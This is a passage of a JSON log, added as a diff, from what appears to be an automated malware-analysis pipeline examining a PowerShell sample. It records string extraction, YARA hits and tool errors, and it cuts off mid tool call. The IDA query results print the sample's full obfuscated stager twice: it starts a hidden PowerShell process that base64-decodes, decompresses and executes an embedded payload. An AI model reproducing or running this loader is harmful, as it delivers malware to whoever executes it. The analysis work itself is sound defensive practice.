+        "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+        "profile": "deep",
+        "limits": {
+          "strings_max": 300,
+          "imports_max": 300,
+          "functions_max": 30,
+          "anomaly_locations_max": 50,
+          "decompile_top_n": 3
+        },
+        "file_summary": {
+          "analysis_id": 1,
+          "file_name": "3048.ps1",
+          "file_path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "file_size": 2800,
+          "type": "text/utf8",
+          "architecture": "NONE",
+          "entropy": 148,
+          "sha256": "14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+          "metadata": {},
+          "entrypoint_ea": null,
+          "layout": [
+            {
+              "name": "",
+              "effective_address": 0,
+              "physical_size": 2800,
+              "virtual_size": 2800,
+              "rights": "",
+              "entropy": 148
+            }
+          ],
+          "kesakode_verdict": []
+        },
+        "views": {
+          "anomalies": [],
+          "anomaly_locations": {},
+          "yara_hits": [
+            {
+              "id": "RunShell",
+              "category": "lateral movement",
+              "reliability": 70,
+              "type": "UNCOMMON",
+              "description": "starts a shell",
+              "num_patterns": 1
+            },
+            {
+              "id": "Powershell",
+              "category": "lateral movement",
+              "reliability": 30,
+              "type": "SUSPICIOUS",
+              "description": "runs a powershell script",
+              "num_patterns": 1
+            }
+          ],
+          "strings": [
+            {
+              "ea": 75,
+              "summary": "powershell"
+            },
+            {
+              "ea": 100,
+              "summary": "powershell"
+            },
+            {
+              "ea": 1575,
+              "summary": "o7pr3d3E1k5jz02X..GAV521nIJ17x5ls7"
+            },
+            {
+              "ea": 1846,
+              "summary": "Gpbr0XQ3VYSTpa6N..K7RjgOTuuIzjddpQ"
+            },
+            {
+              "ea": 922,
+              "summary": "T3JylvqFE5qcDlZQ..8BxX0ldul5V1Ngah"
+            },
+            {
+              "ea": 1173,
+              "summary": "2hkmcF9neg5RB7Ja..gNN9JfmZNyjAfv3v"
+            },
+            {
+              "ea": 775,
+              "summary": "P3VqrGPCxLhlhYXO..vUr8SyWQmhdZowlJ"
+            },
+            {
+              "ea": 2159,
+              "summary": "7F96i2Gg0GWOMwld..QKGJS8cXU5oqmLUV"
+            },
+            {
+              "ea": 2364,
+              "summary": "sX3hKXG549OGzo9r..I49gUI8fvDGiZpyZ"
+            },
+            {
+              "ea": 1436,
+              "summary": "JIzORjuBW1XFNGUr..9XwoM3DpQaGhpNAC"
+            },
+            {
+              "ea": 1379,
+              "summary": "WYuJycRmqIaC0cyb..HFpK8G8ENJPljUam"
+            },
+            {
+              "ea": 1500,
+              "summary": "AraaEnCWshkAR1OD..yqRk6mZ4sh9tvdsR"
+            },
+            {
+              "ea": 1973,
+              "summary": "WZ4ZLhY3guI7s7G0..k2HoVJV9N3SWvZUI"
+            },
+            {
+              "ea": 1777,
+              "summary": "2RwaVKLc7mCSsNxE..HH6NuKI6Oev8Z3at"
+            },
+            {
+              "ea": 2027,
+              "summary": "Eo2s3vBUtuLYploi..fAfYge4eCdAvfIwo"
+            },
+            {
+              "ea": 1327,
+              "summary": "JoEvjoV91JZMDbXv..IXc2SSEI5HvQvpYH"
+            },
+            {
+              "ea": 607,
+              "summary": "611R5MNolexcoi8E..PEQ8yVlplSUvD1X3"
+            },
+            {
+              "ea": 2679,
+              "summary": "RedirectStandardOutput"
+            },
+            {
+              "ea": 409,
+              "summary": "ayBL9nEj5D9YKCaN..yGnURa6drYHkwwDz"
+            },
+            {
+              "ea": 2320,
+              "summary": "VXTTL1eqvOE8I0eJ..wy8c6oqJlKaeOxGh"
+            },
+            {
+              "ea": 1279,
+              "summary": "lU0vnCWIVFB8MI7S..VDfCvzH9olicnRhm"
+            },
+            {
+              "ea": 696,
+              "summary": "JkW7RcEve6LTvO0R..MiTPy83oAY4JfhYp"
+            },
+            {
+              "ea": 511,
+              "summary": "2aOMhRxfK28a3K18..rjhpv3sB8jQ64Xzj"
+            },
+            {
+              "ea": 483,
+              "summary": "1HVVXXqdHVv97FXkCTmQoNyv797"
+            },
+            {
+              "ea": 1741,
+              "summary": "UHz3R3ZHxwY5Hh0k..JU96hldxPZFqKB04"
+            },
+            {
+              "ea": 881,
+              "summary": "4CWlvQHtOPaD257u..795uK5oQ7SVLoPfm"
+            },
+            {
+              "ea": 1129,
+              "summary": "JmRhR7Dc5Mc7JdUncF8m5W"
+            },
+            {
+              "ea": 652,
+              "summary": "7fdx5ayuc9ojlfN8..Lp7Te4P5sMINWmWK"
+            },
+            {
+              "ea": 2074,
+              "summary": "IDsion4QRXMVBygw..hhaEOO1Cli8oxT7A"
+            },
+            {
+              "ea": 260,
+              "summary": "StreamReader"
+            },
+            {
+              "ea": 558,
+              "summary": "fhzuswzHxWXcusOFmOc42lCCc77B"
+            },
+            {
+              "ea": 2553,
+              "summary": "hPfju7f8AKrkmBB0MAAA"
+            },
+            {
+              "ea": 2529,
+              "summary": "KjBcPP5YRyPv22tirfbYv3k"
+            },
+            {
+              "ea": 150,
+              "summary": "ProcessStartInfo"
+            },
+            {
+              "ea": 2603,
+              "summary": "CompressionMode"
+            },
+            {
+              "ea": 2653,
+              "summary": "UseShellExecute"
+            },
+            {
+              "ea": 52,
+              "summary": "WindowsPowerShell"
+            },
+            {
+              "ea": 2129,
+              "summary": "bH1z1MLK3pr6ViKTDmYgGxlzs9MVK"
+            },
+            {
+              "ea": 339,
+              "summary": "MemoryStream"
+            },
+            {
+              "ea": 1153,
+              "summary": "irr6nBfFQXlTbPTQqHK"
+            },
+            {
+              "ea": 390,
+              "summary": "H4sIAAKbYF0CA7VWa4"
+            },
+            {
+              "ea": 2262,
+              "summary": "LU1Xn65QIK0ZBrcTlzhPbecnVh"
+            },
+            {
+              "ea": 2289,
+              "summary": "gQNQ"
+            },
+            {
+              "ea": 2503,
+              "summary": "CFAfzRuF5ECBE24Yii"
+            },
+            {
+              "ea": 91,
+              "summary": "else"
+            },
+            {
+              "ea": 1728,
+              "summary": "XHxWnyqBynZr"
+            },
+            {
+              "ea": 2250,
+              "summary": "Mo7IwddEbwZ"
+            },
+            {
+              "ea": 294,
+              "summary": "Compression"
+            },
+            {
+              "ea": 2447,
+              "summary": "4xLtTc9791g9bIWfph"
+            },
+            {
+              "ea": 2591,
+              "summary": "Compression"
+            },
+            {
+              "ea": 138,
+              "summary": "Diagnostics"
+            },
+            {
+              "ea": 2621,
+              "summary": "Decompress"
+            },
+            {
+              "ea": 2735,
+              "summary": "CreateNoWindow"
+            },
+            {
+              "ea": 2767,
+              "summary": "Diagnostics"
+            },
+            {
+              "ea": 1552,
+              "summary": "n3R8ujJU71sRiqM1"
+            },
+            {
+              "ea": 2789,
+              "summary": "Start"
+            },
+            {
+              "ea": 4,
+              "summary": "IntPtr"
+            },
+            {
+              "ea": 231,
+              "summary": "create"
+            },
+            {
+              "ea": 2779,
+              "summary": "Process"
+            },
+            {
+              "ea": 2296,
+              "summary": "YMX5z7b93TOsryEFGoB3AFV"
+            },
+            {
+              "ea": 33,
+              "summary": "windir"
+            },
+            {
+              "ea": 2724,
+              "summary": "Hidden"
+            },
+            {
+              "ea": 204,
+              "summary": "hidden"
+            },
+            {
+              "ea": 587,
+              "summary": "cG5Ic7w"
+            },
+            {
+              "ea": 2469,
+              "summary": "idS3SIXz8f8bry9w"
+            },
+            {
+              "ea": 217,
+              "summary": "scriptblock"
+            },
+            {
+              "ea": 170,
+              "summary": "FileName"
+            },
+            {
+              "ea": 2117,
+              "summary": "5Gx9vtUIKw5"
+            },
+            {
+              "ea": 2635,
+              "summary": "ReadToEnd"
+            },
+            {
+              "ea": 371,
+              "summary": "FromBase64String"
+            },
+            {
+              "ea": 42,
+              "summary": "sysnative"
+            },
+            {
+              "ea": 546,
+              "summary": "XkxTOYkQiR8"
+            },
+            {
+              "ea": 595,
+              "summary": "9nmEXsF9ztX"
+            },
+            {
+              "ea": 867,
+              "summary": "CpKPfH3FF"
+            },
+            {
+              "ea": 757,
+              "summary": "PcJ7Xm9w92"
+            },
+            {
+              "ea": 2486,
+              "summary": "rH4XhkLzEu9X03"
+            },
+            {
+              "ea": 445,
+              "summary": "B2dGqsRu7h"
+            },
+            {
+              "ea": 464,
+              "summary": "vfbzXgyexmskpWui2Q"
+            },
+            {
+              "ea": 185,
+              "summary": "Arguments"
+            },
+            {
+              "ea": 2711,
+              "summary": "WindowStyle"
+            },
+            {
+              "ea": 277,
+              "summary": "Object"
+            },
+            {
+              "ea": 2670,
+              "summary": "false"
+            },
+            {
+              "ea": 2522,
+              "summary": "PG9eC"
+            },
+            {
+              "ea": 2760,
+              "summary": "System"
+            },
+            {
+              "ea": 2581,
+              "summary": "System"
+            },
+            {
+              "ea": 131,
+              "summary": "System"
+            },
+            {
+              "ea": 124,
+              "summary": "Object"
+            },
+            {
+              "ea": 2441,
+              "summary": "3arKb"
+            },
+            {
+              "ea": 737,
+              "summary": "FHETD1C"
+            },
+            {
+              "ea": 690,
+              "summary": "rhMvS"
+            },
+            {
+              "ea": 1829,
+              "summary": "yJDIb"
+            },
+            {
+              "ea": 1839,
+              "summary": "T1np5e"
+            },
+            {
+              "ea": 456,
+              "summary": "Yjthkwu"
+            },
+            {
+              "ea": 361,
+              "summary": "Convert"
+            },
+            {
+              "ea": 354,
+              "summary": "System"
+            },
+            {
+              "ea": 329,
+              "summary": "System"
+            },
+            {
+              "ea": 322,
+              "summary": "Object"
+            },
+            {
+              "ea": 284,
+              "summary": "System"
+            },
+            {
+              "ea": 250,
+              "summary": "System"
+            },
+            {
+              "ea": 243,
+              "summary": "Object"
+            },
+            {
+              "ea": 1115,
+              "summary": "pCiPG9y8z0cNK"
+            },
+            {
+              "ea": 2703,
+              "summary": "true"
+            },
+            {
+              "ea": 2751,
+              "summary": "true"
+            },
+            {
+              "ea": 1374,
+              "summary": "qa0Q"
+            },
+            {
+              "ea": 745,
+              "summary": "LfB268yzxRN"
+            },
+            {
+              "ea": 306,
+              "summary": "GzipStream"
+            },
+            {
+              "ea": 915,
+              "summary": "tzH4Bk"
+            },
+            {
+              "ea": 1569,
+              "summary": "tdNWz"
+            },
+            {
+              "ea": 13,
+              "summary": "Size"
+            }
+          ],
+          "imports": [],
+          "sections": [
+            {
+              "name": "",
+              "effective_address": 0,
+              "physical_size": 2800,
+              "virtual_size": 2800,
+              "rights": "",
+              "entropy": 148
+            }
+          ],
+          "entropy": {
+            "file_entropy": 148,
+            "regions": [
+              {
+                "name": "",
+                "entropy": 148,
+                "size": null
+              }
+            ]
+          },
+          "functions": [],
+          "constants": [],
+          "carved": [],
+          "virtual_files": [],
+          "structures": []
+        },
+        "functions": [],
+        "constants": [],
+        "anomalies": [],
+        "carved_files": [],
+        "virtual_files": [],
+        "structures": [],
+        "decompilations": {},
+        "script_decompile": null,
+        "unpack_result": null,
+        "errors": []
+      },
+      "error": null,
+      "engine": "langgraph"
+    },
+    {
+      "step": 9,
+      "tool": "ida_query",
+      "args": {
+        "sql": "SELECT content, address, length FROM strings ORDER BY length DESC LIMIT 30"
+      },
+      "reason": "langgraph tool call",
+      "result": {
+        "columns": [
+          "content",
+          "address",
+          "length"
+        ],
+        "rows": [
+          {
+            "content": "if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''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''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\n",
+            "address": "0",
+            "length": "2800"
+          }
+        ],
+        "row_count": 1,
+        "total_row_count": 1,
+        "truncated": false,
+        "source": "ida_query",
+        "session_id": "ida-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+        "audit_path": "/opt/samples/logs/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/audit.jsonl"
+      },
+      "error": null,
+      "engine": "langgraph"
+    },
+    {
+      "step": 10,
+      "tool": "ghidra_query",
+      "args": {
+        "sql": "SELECT content, address, length FROM strings ORDER BY length DESC LIMIT 30",
+        "max_rows": 30
+      },
+      "reason": "langgraph tool call",
+      "result": {
+        "error": "ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n"
+      },
+      "error": "ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n",
+      "engine": "langgraph"
+    },
+    {
+      "step": 11,
+      "tool": "ida_query",
+      "args": {
+        "sql": "SELECT content FROM strings WHERE length > 100"
+      },
+      "reason": "langgraph tool call",
+      "result": {
+        "columns": [
+          "content"
+        ],
+        "rows": [
+          {
+            "content": "if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''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''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\n"
+          }
+        ],
+        "row_count": 1,
+        "total_row_count": 1,
+        "truncated": false,
+        "source": "ida_query",
+        "session_id": "ida-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+        "audit_path": "/opt/samples/logs/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/audit.jsonl"
+      },
+      "error": null,
+      "engine": "langgraph"
+    },
+    {
+      "step": 12,
+      "tool": "yara_scan",
+      "args": {},
+      "reason": "langgraph tool call",
+      "result": {
+        "rule_count": 5,
+        "matches": [
+          {
+            "rule": "domain",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": [
+              {
+                "id": "$domain_regex",
+                "offset": 0,
+                "length": 2,
+                "xor_key": null
+              }
+            ]
+          },
+          {
+            "rule": "powershell",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": [
+              {
+                "id": "$a",
+                "offset": 59,
+                "length": 10,
+                "xor_key": null
+              }
+            ]
+          },
+          {
+            "rule": "IP",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": [
+              {
+                "id": "$ipv6",
+                "offset": 11,
+                "length": 2,
+                "xor_key": null
+              }
+            ]
+          },
+          {
+            "rule": "contains_base64",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": [
+              {
+                "id": "$a",
+                "offset": 52,
+                "length": 16,
+                "xor_key": null
+              }
+            ]
+          },
+          {
+            "rule": "Antivirus",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": []
+          }
+        ],
+        "engine": "yara-x",
+        "rules_compiled": 454,
+        "compile_errors": [
+          "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
+          "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_pornClicker.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_pornClicker.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_Spywaller.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Spywaller.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_OmniRat.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_OmniRat.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Wshell_ChineseSpam.yar: error[E014]: invalid regular expression\n  --> /opt/samples/rules/flat/Wshell_ChineseSpam.yar:17:42\n   |\n17 |         $c = /if ?\\(\\$_POST\\[Submit\\]\\) ?{/\n   |                                          ^ unclosed counted repetition\n   |\n   = note: did you mean `\\{` instead of `{`?",
+          "/opt/samples/rules/flat/Android_FakeBank_Fanta.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_FakeBank_Fanta.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_AliPay_smsStealer.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_AliPay_smsStealer.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found"
+        ],
+        "incomplete": true
+      },
+      "error": null,
+      "engine": "langgraph"
+    },
+    {
+      "step": 13,
+      "tool": null,
+      "reason": "langgraph planner tool_calls",
+      "tool_calls": [
+        {
+          "name": "ghidra_query",
+          "args": {
+            "sql": "SELECT content, address, length FROM strings ORDER BY length DESC LIMIT 30",
+            "max_rows": 30
+          }
+        },
+        {
+          "name": "floss_extract",
+          "args": {}
+        },
+        {
+          "name": "malcat_analyze",
+          "args": {
+            "profile": "deep"
+          }
+        },
+        {
+          "name": "ida_query",
+          "args": {
